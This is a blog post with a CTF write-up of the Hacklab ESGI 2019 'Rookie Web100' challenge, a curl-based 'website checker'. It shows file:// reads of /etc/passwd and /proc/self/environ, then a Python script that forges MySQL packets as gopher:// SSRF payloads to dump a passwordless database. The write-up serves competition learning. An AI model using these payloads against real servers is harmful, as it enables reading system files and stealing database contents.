<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Hacklab ESGI 2019 |  Rookie Web100 Writeup ::
        CHERIEF Yassine — Cybersecutrity enthusiast
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Challenge Description    Category Points Solves     web 100 18    This is the URL for the challenge.
URL:http://ctf.hacklab-esgi.org:8082/
So, as soon as we visit the given URL, we get a simple web page saying Website Checker and the title saying super curling (this gonna be fun!!). we notice that there is one input in the page, whatever you give as input gets passed to curl as a parameter."
/>
<meta
  name="keywords"
  content="cybersecurity, security, networking, ctf, writeups, education, blog, algeria, algerian, student"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://yassinecherief.com/posts/hacklab-esgi-2019-rookie-web-writeup/" />





<link rel="stylesheet" href="https://yassinecherief.com/assets/style.css" />

<link rel="stylesheet" href="https://yassinecherief.com/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://yassinecherief.com/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://yassinecherief.com/img/favicon.png" />


<link href="https://yassinecherief.com/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://yassinecherief.com/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Hacklab ESGI 2019 |  Rookie Web100 Writeup"/>
<meta name="twitter:description" content="Challenge Description    Category Points Solves     web 100 18    This is the URL for the challenge.
URL:http://ctf.hacklab-esgi.org:8082/
So, as soon as we visit the given URL, we get a simple web page saying Website Checker and the title saying super curling (this gonna be fun!!). we notice that there is one input in the page, whatever you give as input gets passed to curl as a parameter."/>



<meta property="og:title" content="Hacklab ESGI 2019 |  Rookie Web100 Writeup" />
<meta property="og:description" content="Challenge Description    Category Points Solves     web 100 18    This is the URL for the challenge.
URL:http://ctf.hacklab-esgi.org:8082/
So, as soon as we visit the given URL, we get a simple web page saying Website Checker and the title saying super curling (this gonna be fun!!). we notice that there is one input in the page, whatever you give as input gets passed to curl as a parameter." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://yassinecherief.com/posts/hacklab-esgi-2019-rookie-web-writeup/" />
<meta property="article:published_time" content="2019-04-08T10:59:30+02:00" />
<meta property="article:modified_time" content="2019-04-08T10:59:30+02:00" /><meta property="og:site_name" content="CHERIEF Yassine" />






<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
    onload="renderMathInElement(document.body);"></script>



  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >./1337.sh</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/posts">Posts</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/categories">Categories</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/posts">Posts</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/categories">Categories</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Hacklab ESGI 2019 |  Rookie Web100 Writeup</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2019-04-08
        </span>

        
          
        
      

      
        <span class="post-author"
          >— Written by CHERIEF Yassine</span
        >


      
        <span class="post-read-time"
          >— 3 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://yassinecherief.com/tags/ctf/">#ctf</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/writeup/">#writeup</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/security/">#security</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/web/">#web</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/gopher/">#gopher</a>&nbsp;
        
          <a href="https://yassinecherief.com/tags/exploit/">#exploit</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      <h2 id="challenge-description">Challenge Description</h2>
<table>
<thead>
<tr>
<th><strong>Category</strong></th>
<th><strong>Points</strong></th>
<th><strong>Solves</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>web</td>
<td>100</td>
<td>18</td>
</tr>
</tbody>
</table>
<!-- raw HTML omitted -->
<p>This is the URL for the challenge.</p>
<p><strong><code>URL:http://ctf.hacklab-esgi.org:8082/</code></strong></p>
<p>So, as soon as we visit the given URL, we get a simple web page saying <code>Website Checker</code> and the title saying <code>super curling</code> (this gonna be fun!!). we notice that there is one input in the page, whatever you give as input gets passed to <code>curl</code> as a parameter. At first I thought that it was a just a simple command injection vulnerability (this supposition tuned out to be <code>False!</code>).</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554752661/super_curling.png" alt="super_curling_webpage"></p>
<p>If we provide <code>www.google.com</code> as input, we get the content of google displayed to us.So I started playing with the input to see if I can get some unexpected output.</p>
<p>Let&rsquo;s try to access <code>/etc/passwd</code>, we will use the <code>file</code> protocol to do so, we can get access to local files with curl using the file protocol. <br>
<strong><code>input: file:///etc/passwd</code></strong></p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753146/etcpasswd_curl.png" alt="etcpasswd_curl"></p>
<p>we can notice <code>mysql</code> and <code>www-data</code> users.<br>
Let&rsquo;s try accessing <code>/proc/self/environ</code>, by inputing <code>file:///proc/self/environ</code>.</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753425/proc_self_environ.png" alt="proc_self_environ"></p>
<p>PWD = /var/www/html</p>
<p>let&rsquo;s try accessing <strong>/var/www/html/config.php</strong>, we get nothing :'(, after a while a friend told me to check <strong>/var/www/html/config_test.php</strong>, after doing that, nothing gets included in the page, but if we check the page source (<code>Ctrl+U</code>), we get some interesting php code.</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554753689/page_source_config_test.png" alt="page_source"></p>
<p>We notice an interesting comment,</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// TODO: MySQL connection with &#34;tiix&#34; user and adding a MySQL password...
</span></code></pre></div><p>We have a mysql user <code>tiix</code> with no password!!.</p>
<p>let&rsquo;s use <code>gopher</code> protocol and build a GREAT payload to connect to the database as <code>tiix</code> user.</p>
<p>To do so, we need to know how does mysql creates a connection packet and the Query as well.</p>
<p>let&rsquo;s sniff some traffic generated by the <code>mysql</code> command on our own machine.</p>
<p>I have created a new mysql user before that, its not really necessary.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">CREATE</span> <span style="color:#66d9ef">USER</span> <span style="color:#e6db74">&#39;tiix&#39;</span><span style="color:#f92672">@</span><span style="color:#e6db74">&#39;localhost&#39;</span>;
</code></pre></div><p>We can now execute the mysql command and see the generated packets in <code>wireshark</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -u tiix -h 127.0.0.1
</code></pre></div><p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554754846/wireshark_mysql_conn.png" alt="wireshark_mysql_conn"></p>
<p>we now need to convert to <code>Raw bytes</code> and make a gopher payload link.</p>
<ul>
<li><strong>converting to raw bytes in wireshark</strong></li>
</ul>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554754847/wireshark_mysql_raw_bytes.png" alt="raw_bytes_mysql_packet"></p>
<ul>
<li><strong>making a gopher payload link.</strong></li>
</ul>
<p>To do so all we need to do is precced each byte with an <code>%</code> symbol.</p>
<p>here is a script to do it with python.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gopher_exploit</span>(payload_str):
    payload <span style="color:#f92672">=</span> [payload_str[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload_str), <span style="color:#ae81ff">2</span>)]
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;gopher://127.0.0.1:3306/_%&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">.</span>join(payload)
</code></pre></div><p>we get this payload as a result.</p>
<pre><code>gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%69%69%78%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%01%00%00%00%03%01%00%00%00%01
</code></pre><p>Here is the result when inputing the payload.<br>
<img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554755781/result_gopher_payload_1.png" alt="result_gopher_paylaod1"></p>
<p>We can see the mysql Database version in the output.
Now we can execute SQL queries.
Here is a script I made to automate the process, it takes a query as argument and returns a gopher payload link. (We no longer need wireshark!!).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#75715e"># coding : utf-8</span>
<span style="color:#f92672">import</span> sys


<span style="color:#66d9ef">global</span> mysql_username
<span style="color:#66d9ef">global</span> hex_user

mysql_username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tiix&#39;</span>
hex_user <span style="color:#f92672">=</span> mysql_username<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gopher_exploit</span>(payload_str):
    payload <span style="color:#f92672">=</span> [payload_str[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload_str), <span style="color:#ae81ff">2</span>)]
    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;gopher://127.0.0.1:3306/_%&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;%&#39;</span><span style="color:#f92672">.</span>join(payload)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(query):
    <span style="color:#66d9ef">global</span> mysql_username
    <span style="color:#66d9ef">global</span> hex_user

    length <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a3&#39;</span>
    <span style="color:#66d9ef">if</span> len(mysql_username) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
        length <span style="color:#f92672">=</span> (chr(<span style="color:#ae81ff">0xa3</span><span style="color:#f92672">+</span>(len(mysql_username) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()


    conn_packet <span style="color:#f92672">=</span> length <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;00000185a6ff0100000001210000000000000000000000000000000000000000000000&#39;</span>
    conn_packet <span style="color:#f92672">+=</span> hex_user
    conn_packet <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c&#39;</span>
    conn_packet <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d&#39;</span>
    conn_packet <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;067838365f36340c70726f6772616d5f6e616d65056d7973716c&#39;</span>


    auth <span style="color:#f92672">=</span> conn_packet<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)

    query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>strip()
    hex_query <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>encode()<span style="color:#f92672">.</span>hex()
    query_len_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{:x}&#39;</span><span style="color:#f92672">.</span>format((int((len(hex_query) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)))

    query_payload <span style="color:#f92672">=</span> query_len_hex<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#39;0&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;00000003&#34;</span> <span style="color:#f92672">+</span> hex_query


    <span style="color:#66d9ef">print</span>(gopher_exploit(auth <span style="color:#f92672">+</span> query_payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0100000001&#39;</span>))


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
   query <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
   main(query)
</code></pre></div><ul>
<li><strong>let&rsquo;s dump databases</strong></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 exploit.py <span style="color:#e6db74">&#34;show databases&#34;</span>
</code></pre></div><p>After inputing the resulting gopher payload link we find a database named <code>securityday</code>.</p>
<ul>
<li><strong>Dumping database tables.</strong></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 exploit.py <span style="color:#e6db74">&#34;use securityday;show tables;&#34;</span>
</code></pre></div><p>We get two tables:</p>
<ul>
<li>nothinghere</li>
<li>users</li>
</ul>
<p>Let&rsquo;s select now everything from <code>nothinghere</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 exploit.py <span style="color:#e6db74">&#34;use securityday; SELECT * FROM nothinghere;&#34;</span>
</code></pre></div><p>After the last payload we get the flag :D.</p>
<p><img src="https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1554756722/flag_rookie.png" alt="flag_rookie"></p>
<p><strong><code>FLAG: ESGI{W3lC0me_R00ki3_M0th3r_1s_0ld}</code></strong></p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://yassinecherief.com/posts/angstromctf-2019-secret-sheep-society-writeup-crypto/">
                  <span class="button__icon">←</span>
                  <span class="button__text">AngstromCTF 2019 Secret Sheep Society | CTF Writeup</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://yassinecherief.com/posts/setup-ftp-and-ftps-server-on-archlinux-server/">
                  <span class="button__text">Setup FTPS server on Archlinux</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "omega-coder" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">Yassine CHERIEF</div>
      
  </div>
</footer>

<script src="https://yassinecherief.com/assets/main.js"></script>
<script src="https://yassinecherief.com/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
